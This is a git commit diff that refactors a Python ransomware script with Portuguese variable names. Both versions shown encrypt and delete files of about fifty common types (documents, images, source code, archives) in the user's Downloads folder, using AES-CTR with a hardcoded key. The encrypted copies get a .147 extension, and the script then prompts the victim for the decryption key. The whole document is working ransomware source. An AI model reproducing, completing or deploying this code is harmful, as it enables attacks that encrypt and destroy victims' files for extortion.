b3cea7cb7c7753af80623fa7af236b6149b1e511
Desapressado <59629875+Desapressad0x@users.noreply.github.com>
2023-02-25 09:50:07 -0300

    Update main.py

--- main.py
+++ main.py
@@ -4,49 +4,48 @@ import pyaes
 import threading
 from pathlib import Path
 
-arquivos_extensoes = ["*.pl","*.7z","*.rar","*.m4a","*.py","*.cpp","*.cs","*.css","*.wma","*.avi","*.wmv","*.d3dbsp","*.sc2save","*.sie","*.sum","*.bkp","*.flv","*.js","*.raw","*.jpeg","*.tar","*.zip","*.tar*.gz","*.cmd","*.key","*.DOT","*.docm","*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.jpg", "*.png", "*.csv", "*.sql", "*.mdb", "*.sln", "*.php", "*.asp", "*.aspx", "*.html", "*.xml", "*.psd", "*.bmp"]
-pasta_inicial = Path.home()/"Downloads" # coloquei na downloads pra teste
- 
-def crypt():
-    for arquivos in arquivos_extensoes:
-        for formato in glob.glob(arquivos):
-            f = open(f'{pasta_inicial}\\{formato}', 'rb')
-            bkk = f.read()
-            f.close()
-            os.remove(f'{pasta_inicial}\\{formato}') 
-            key = b"l1eqybC6EfUwOnxjI4XeimFkdnPPe9jV"
-            aes = pyaes.AESModeOfOperationCTR(key)
-            juuj = aes.encrypt(bkk)
-            arquivo_batata = formato + ".147"
-            arquivo_batata = open(f'{pasta_inicial}\\{arquivo_batata}', 'wb')
-            arquivo_batata.write(juuj)
-            arquivo_batata.close()
+extensoes_arquivos = ["*.pl","*.7z","*.rar","*.m4a","*.py","*.cpp","*.cs","*.css","*.wma","*.avi","*.wmv","*.d3dbsp","*.sc2save","*.sie","*.sum","*.bkp","*.flv","*.js","*.raw","*.jpeg","*.tar","*.zip","*.tar*.gz","*.cmd","*.key","*.DOT","*.docm","*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.jpg", "*.png", "*.csv", "*.sql", "*.mdb", "*.sln", "*.php", "*.asp", "*.aspx", "*.html", "*.xml", "*.psd", "*.bmp"]
+pasta_inicial = Path.home()/"Downloads" # teste
 
-def decrypt(key):
+def criptografar_arquivos():
+    for extensao_arquivo in extensoes_arquivos:
+        for formato in glob.glob(extensao_arquivo):
+            arquivo = open(f'{pasta_inicial}/{formato}', 'rb')
+            conteudo_arquivo = arquivo.read()
+            arquivo.close()
+            os.remove(f'{pasta_inicial}/{formato}') 
+            chave = b"l1eqybC6EfUwOnxjI4XeimFkdnPPe9jV"
+            aes = pyaes.AESModeOfOperationCTR(chave)
+            conteudo_arquivo_criptografado = aes.encrypt(conteudo_arquivo)
+            arquivo_criptografado = formato + ".147"
+            arquivo_criptografado = open(f'{pasta_inicial}/{arquivo_criptografado}', 'wb')
+            arquivo_criptografado.write(conteudo_arquivo_criptografado)
+            arquivo_criptografado.close()
+
+def descriptografar_arquivos(chave):
     try:
-        for arquivo in glob.glob('*.147'):
-            blll = key.encode()
-            batata = open(arquivo, 'rb')
-            nbatata = batata.read()
-            dkey = blll
-            daes = pyaes.AESModeOfOperationCTR(dkey)
-            bll = daes.decrypt(nbatata)
-            formato = arquivo.split('.')
-            bugalu = formato[0] + '.' + formato[1]
-            bugalu2 = open(f'{pasta_inicial}\\{bugalu}', 'wb')
-            bugalu2.write(bll)
-            bugalu2.close()
+        for arquivo_criptografado in glob.glob('*.147'):
+            chave_bytes = chave.encode()
+            arquivo = open(arquivo_criptografado, 'rb')
+            conteudo_arquivo_criptografado = arquivo.read()
+            des_aes = pyaes.AESModeOfOperationCTR(chave_bytes)
+            conteudo_arquivo = des_aes.decrypt(conteudo_arquivo_criptografado)
+            formato = arquivo_criptografado.split('.')
+            nome_arquivo = formato[0] + '.' + formato[1]
+            arquivo_descriptografado = open(f'{pasta_inicial}/{nome_arquivo}', 'wb')
+            arquivo_descriptografado.write(conteudo_arquivo)
+            arquivo_descriptografado.close()
 
     except Exception:
         pass
 
 def main():
-    key = input("[*] Seus arquivos foram criptografados. para descriptografá-los, Insira a chave de descriptografia: ")
-    if key == 'l1eqybC6EfUwOnxjI4XeimFkdnPPe9jV':
-       decrypt(key)
-       for arquivos in glob.glob('*.147'):
-           os.remove(arquivos)
-           print('[!] Arquivo descriptografado: ' + arquivos)
+    chave = input("[*] Seus arquivos foram criptografados. Para descriptografá-los, insira a chave de descriptografia: ")
+    if chave == 'l1eqybC6EfUwOnxjI4XeimFkdnPPe9jV':
+        descriptografar_arquivos(chave)
+        for arquivo_criptografado in glob.glob('*.147'):
+            os.remove(arquivo_criptografado)
+            print(f'[!] Arquivo descriptografado: {arquivo_criptografado}')
 
-threading.Thread(target=crypt).start()
+threading.Thread(target=criptografar_arquivos).start()
 main()
